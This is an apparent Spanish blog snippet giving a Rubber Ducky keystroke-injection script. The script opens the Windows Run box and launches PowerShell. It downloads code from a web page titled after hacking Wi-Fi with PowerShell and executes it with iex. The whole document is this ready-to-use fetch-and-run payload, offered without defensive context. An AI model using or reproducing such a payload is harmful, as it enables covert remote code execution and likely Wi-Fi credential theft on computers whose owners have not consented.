# Scripts en Rubber Ducky (parte 2)
## Ducky scripts 
### URL: https://www.jesusninoc.com/2017/03/20/scripts-en-rubber-ducky-parte-2/
```PowerShell
DELAY 750
GUI r
DELAY 750
STRING powershell iex (((iwr "https://www.jesusninoc.com/2017/01/15/hackear-wifi-con-powershell/").AllElements | Where class -eq 'crayon-pre').outerText); pause
ENTER

```
